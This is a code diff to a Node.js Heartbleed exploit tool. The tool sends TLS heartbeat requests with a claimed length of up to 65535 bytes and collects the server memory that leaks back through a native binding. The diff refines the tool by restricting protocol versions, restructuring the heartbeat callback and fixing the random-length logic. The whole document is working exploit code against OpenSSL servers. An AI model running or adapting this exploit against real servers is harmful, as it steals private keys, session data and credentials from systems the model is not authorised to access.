@@ -1,5 +1,6 @@
 #!/usr/bin/env node
 var binding = require('bindings')('heartbleed');
+var constants = require('constants');
 var fs = require('fs');
 var tls = require('tls');
 var dns = require('dns');
@@ -45,7 +46,10 @@ function heartbleed(ip, port, host) {
   var s = tls.connect({
     port: port,
     host: ip,
-    ciphers: argv.ciphers || null
+    ciphers: argv.ciphers || null,
+    secureOptions: constants.SSL_OP_NO_SSLv2 |
+                   constants.SSL_OP_NO_SSLv3 |
+                   constants.SSL_OP_NO_TLSv1
   }, function() {
     // Lazily load `m` and `e`
     if (!m) {
@@ -59,31 +63,34 @@ function heartbleed(ip, port, host) {
     setTimeout(function() {
       // NOTE: Will be picked up by isSessionReused
       s.sslWrap = new binding.SSLWrap();
-      s.sslWrap.onheartbeat = function(buf) {
-        acc.push(buf);
-        total += buf.length;
-
-        // Print number of bytes downloaded
-        reportProgress(buf.length);
-
-        if (total < sent)
-          return;
-        var chunk = Buffer.concat(acc, total);
-
-        test(chunk);
-        send();
-      };
+      s.sslWrap.onheartbeat = onheartbeat;
       send();
     }, 10);
+
+    function onheartbeat(buf) {
+      acc.push(buf);
+      total += buf.length;
+
+      // Print number of bytes downloaded
+      reportProgress(buf.length);
+
+      if (total < sent)
+        return;
+      var chunk = Buffer.concat(acc, total);
+
+      test(chunk);
+      send();
+    }
 
     var acc = [], total = 0, sent = 0;
     function send() {
       acc = [];
       total = 0;
+      var max = 0xffff;
       if (argv.random)
-        sent = (Math.random() * 65535) | 1;
+        sent = ((Math.random() * (max - 1)) | 0) + 1;
       else
-        sent = 0xffff;
+        sent = max;
       s.sslWrap.setHeartbeatLength(sent);
       s.pair.ssl.isSessionReused();
     }
